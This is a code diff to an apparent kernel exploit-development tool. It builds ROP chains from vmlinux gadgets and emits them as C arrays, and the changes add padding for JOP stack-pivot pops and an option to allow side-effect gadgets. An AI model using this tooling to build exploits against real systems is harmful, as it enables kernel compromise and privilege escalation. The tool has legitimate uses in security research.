@@ -242,11 +242,16 @@ def pivot_to_c_comment(pivot, kern_base):
     return "\n".join(lines)
 
 
-def ropchain_to_c_array(rop_chain, symbol_map, var_name, kern_base):
+def ropchain_to_c_array(rop_chain, symbol_map, var_name, kern_base,
+                        pivot_offset=0):
     """Render a RopChain as a standalone C uint64_t array.
 
     Used for indirect pivots where the chain lives at a separate known
     address rather than inline in the exploit object.
+
+    pivot_offset: bytes of padding consumed by pivot's extra pops before
+    ret (e.g., pop r13; pop r14; pop r15 = 24 bytes).  Prepends junk
+    entries so ret lands on the first real gadget.
     """
     all_items = []
     for c in rop_chain.chains:
@@ -256,6 +261,10 @@ def ropchain_to_c_array(rop_chain, symbol_map, var_name, kern_base):
 
     lines = []
     lines.append("uint64_t {}[] = {{".format(var_name))
+    # Prepend padding for pivot's extra pops
+    for i in range(0, pivot_offset, 8):
+        lines.append("    {}, // padding (pivot pop)".format(
+            _fmt_val_padded(0, kern_base)))
     for i, item in enumerate(all_items):
         val = item.getValue(rop_chain.base_addr)
         comment = item.comment
@@ -678,7 +687,7 @@ def main():
     print("Loading {}...".format(vmlinux))
     e = Exrop(vmlinux)
     e.find_gadgets(cache=True, kernel_mode=True)
-    e.clean_only = True
+    e.clean_only = not prompt_yn("Include non-clean gadgets (side effects)?", default=False)
     print("Gadgets loaded.\n")
 
     # Template selection
@@ -861,8 +870,10 @@ def main():
                                        shift_info=shift_info))
     if is_indirect:
         c_lines.append("")
+        poff = getattr(pivot.pivot_gadget, 'pivot_offset', 0) if \
+            pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push') else 0
         c_lines.append(ropchain_to_c_array(chain, symbol_map, "rop_chain",
-                                           kern_base))
+                                           kern_base, pivot_offset=poff))
     c_output = "\n".join(c_lines) + "\n"
 
     print("\n=== Generated C code ===\n")
